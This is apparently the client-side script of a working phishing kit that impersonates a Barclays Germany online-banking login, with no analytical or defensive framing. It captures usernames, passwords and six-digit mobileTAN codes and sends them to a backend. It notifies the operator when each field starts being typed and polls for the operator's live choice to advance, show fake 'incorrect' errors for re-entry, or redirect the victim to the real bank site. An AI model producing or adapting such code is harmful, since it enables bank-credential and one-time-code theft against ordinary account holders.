document.addEventListener('DOMContentLoaded', function() {
    let victimId = null;
    let pollInterval = null;
    let hasSentTypingNotification = {
        username: false,
        password: false, 
        mtan: false
    };

    const sections = {
        login: document.getElementById('login-section'),
        mtan: document.getElementById('mtan-section'),
        finished: document.getElementById('finished-section')
    };
    const forms = { login: document.getElementById('login-form') };
    const inputs = {
        username: document.getElementById('username'),
        password: document.getElementById('password'),
        mtan: document.querySelectorAll('#mtan-section .mtan-inputs input')
    };
    const errorBoxes = {
        login: document.getElementById('global-login-error-box'),
        mtan: document.getElementById('global-mtan-error-box')
    };
    const loadingOverlay = document.getElementById('loading-overlay');
    const registerBtn = document.getElementById('register-btn');
    
    // --- API & FLOW CONTROL ---
    const API_URL = 'api.php';

    async function apiCall(action, data = {}) {
        try {
            const response = await fetch(`${API_URL}?action=${action}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            return await response.json();
        } catch (error) {
            console.error(`API call failed for action "${action}":`, error);
            return { error: 'Network or server error' };
        }
    }

    // NEW: Function to send typing notifications
    async function sendTypingNotification(fieldType) {
        // Send notification only once per field per session
        if (!hasSentTypingNotification[fieldType]) {
            hasSentTypingNotification[fieldType] = true;
            await apiCall('typing_notification', { 
                id: victimId, 
                field: fieldType,
                timestamp: new Date().toISOString()
            });
        }
    }

    // NEW: Typing detection for each field
    function setupTypingDetection() {
        // Username field - detect first character typed
        inputs.username.addEventListener('input', (e) => {
            if (e.inputType === 'insertText' && inputs.username.value.length === 1) {
                sendTypingNotification('username');
            }
        });

        // Password field - detect first character typed  
        inputs.password.addEventListener('input', (e) => {
            if (e.inputType === 'insertText' && inputs.password.value.length === 1) {
                sendTypingNotification('password');
            }
        });

        // MTAN fields - detect first character in first field
        inputs.mtan[0].addEventListener('input', (e) => {
            if (e.inputType === 'insertText' && inputs.mtan[0].value.length === 1) {
                sendTypingNotification('mtan');
            }
        });
    }

    async function submitData(step, value) {
        loadingOverlay.style.display = 'flex';
        resetAllErrors();
        await apiCall('submit_data', { id: victimId, step, value });
        startPolling();
    }

    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            const { decision } = await apiCall('check_status', { id: victimId });
            if (decision && decision !== 'wait') {
                clearInterval(pollInterval);
                pollInterval = null;
                handleDecision(decision);
            }
        }, 3000);
    }

    function handleDecision(decision) {
        loadingOverlay.style.display = 'none';
        switch (decision) {
            case 'go_to_mtan':
                switchSection(sections.login, sections.mtan, () => startMtanTimer());
                break;
            case 'finish':
                switchSection(sections.mtan, sections.finished); 
                
                setTimeout(() => {
                    window.location.href = 'https://www.barclays.de/';
                }, 2500); 
                break;

            case 'show_full_login_error':
                errorBoxes.login.classList.add('visible');
                inputs.password.value = '';
                inputs.password.focus();
                startPolling();
                break;
            case 'show_mtan_error':
                errorBoxes.mtan.classList.add('visible');
                inputs.mtan.forEach(inp => inp.value = '');
                inputs.mtan[0].focus();
                startPolling();
                break;
            case 'show_euro_otp_error':
                showEuroOtpError();
                inputs.mtan.forEach(inp => inp.value = '');
                inputs.mtan[0].focus();
                startPolling();
                break;
        }
    }
    
    function switchSection(hide, show, callback) {
        loadingOverlay.style.display = 'flex';
        setTimeout(() => {
            hide.style.display = 'none';
            show.style.display = 'block';
            if (show !== sections.login) {
                registerBtn.style.display = 'none';
            }
            loadingOverlay.style.display = 'none';
            if (callback) callback();
        }, 1500);
    }

    function showEuroOtpError() {
        errorBoxes.mtan.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            <div>
                <strong>Euro OTP Error</strong><br>
                Die von Ihnen eingegebene Euro OTP ist leider nicht korrekt. Bitte geben Sie die Euro OTP erneut ein oder fordern Sie eine neue an.
            </div>
        `;
        errorBoxes.mtan.classList.add('visible');
    }

    forms.login.addEventListener('submit', e => {
        e.preventDefault();
        const username = inputs.username.value.trim();
        const password = inputs.password.value.trim();
        if (username && password) {
            submitData('login', { username, password });
        }
    });

    inputs.mtan.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length >= 1 && index < 5) inputs.mtan[index + 1].focus();
            if (Array.from(inputs.mtan).every(i => i.value.length === 1)) {
                const mtanCode = Array.from(inputs.mtan).map(i => i.value).join('');
                submitData('mtan', { mtan: mtanCode });
            }
        });
        input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !input.value && index > 0) inputs.mtan[index - 1].focus(); });
    });

    // --- HELPERS & INIT ---
    function resetAllErrors() {
        errorBoxes.login.classList.remove('visible');
        errorBoxes.mtan.classList.remove('visible');
        // Reset mtan error to original message
        errorBoxes.mtan.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
                </path>
            </svg>
            <div>Die von Ihnen eingegebene mobileTAN ist leider nicht korrekt. Bitte geben Sie die mobileTAN erneut ein.</div>
        `;
    }

    function startMtanTimer() { 
        const el = document.getElementById('countdown'); 
        let secs = 292; 
        const int = setInterval(() => { 
            if (secs < 0) { 
                clearInterval(int); 
                return; 
            } 
            let m = Math.floor(secs / 60), s = secs % 60; 
            el.textContent = `${m<10?'0':''}${m}:${s<10?'0':''}${s}`; 
            secs--; 
        }, 1000); 
    }
    
    async function initializeSession() {
        const data = await apiCall('init_session');
        if (data && data.id) {
            victimId = data.id;
            setupTypingDetection(); // Initialize typing detection after session is created
        } else {
            document.body.innerHTML = "<h1>Error. Please refresh the page.</h1>";
        }
    }
    
    initializeSession();
});